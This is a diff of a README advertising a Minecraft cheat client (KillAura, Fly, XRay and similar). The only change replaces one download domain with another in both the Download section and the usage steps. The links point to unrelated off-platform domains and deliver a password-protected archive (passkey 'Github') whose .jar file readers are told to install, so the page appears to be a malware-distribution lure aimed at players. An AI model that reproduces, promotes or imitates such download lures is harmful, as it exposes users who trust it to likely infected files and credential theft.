@@ -6,7 +6,7 @@ Minecraft build with hacked client, utility mods, ESP, KillAura, Fly, Speed, XRa
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -85,7 +85,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Install Fabric API for your Minecraft version.
 3. Place the `.jar` file in your `mods` folder.
 4. Launch Minecraft with the Fabric profile.
